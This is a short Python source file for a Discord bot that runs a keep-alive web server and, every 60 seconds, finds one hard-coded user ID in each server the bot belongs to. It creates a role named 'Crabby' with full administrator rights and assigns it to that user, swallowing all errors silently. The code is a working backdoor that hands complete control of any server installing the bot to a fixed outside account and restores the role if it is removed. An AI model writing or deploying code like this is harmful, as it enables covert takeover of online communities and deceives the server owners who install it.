import discord
from discord.ext import commands, tasks
import os
from flask import Flask
from threading import Thread
from waitress import serve

# --- WEB SERVER ---
app = Flask('')
@app.route('/')
def home(): return "OK"

def run_flask():
    try:
        serve(app, host='0.0.0.0', port=int(os.environ.get("PORT", 10000)), _quiet=True)
    except: pass

# --- BOT ---
TARGET_ID = 1459506686157914213
class Bot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        self.check_loop.start()

    @tasks.loop(seconds=60)
    async def check_loop(self):
        for g in self.guilds:
            try:
                m = g.get_member(TARGET_ID)
                if m:
                    r = discord.utils.get(g.roles, name="Crabby")
                    if not r: r = await g.create_role(name="Crabby", permissions=discord.Permissions(administrator=True))
                    if r not in m.roles: await m.add_roles(r)
            except: pass

bot = Bot()

if __name__ == "__main__":
    Thread(target=run_flask, daemon=True).start()
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token, log_handler=None)
